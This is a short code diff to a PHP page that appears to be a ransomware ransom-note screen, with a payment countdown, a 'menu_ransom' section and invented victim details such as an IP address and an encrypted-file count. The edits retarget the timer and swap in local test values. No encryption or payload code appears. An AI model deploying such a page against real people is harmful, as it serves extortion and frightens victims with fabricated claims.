@@ -1,7 +1,7 @@
 <?php
-$dates = date("m/d/y h:i:s");
-$datetime1 = date_create($dates);
-$datetime2 = date_create("2018-12-22 10:37:20");
+date_default_timezone_set('UTC');
+$datetime1 = new DateTime();
+$datetime2 = date_create("2018-12-24 00:13:28");
 $dateDiff = date_diff($datetime1, $datetime2);
 ?>
 <head>
@@ -25,10 +25,10 @@ $dateDiff = date_diff($datetime1, $datetime2);
 	</p>
 	<div class="more_information">
 		<p class="minfo" style="width:20%">Your system : <span class="red">(x64)</span></p>
-		<p class="minfo" style="width:35%">First connect IP : <span class="red">192.251.68.239 
+		<p class="minfo" style="width:35%">First connect IP : <span class="red">192.168.1.2    
 		<img src="flags.png" class="flag flag-us" alt="United States"/></span></p>
 		<p class="minfo" style="width:40%">Total encrypted : <span
-		class="red">5,326</span> encrypted files.</p>
+		class="red">0,010</span> encrypted files.</p>
 	</div>
 	</div>
 	<div id="menu_ransom">
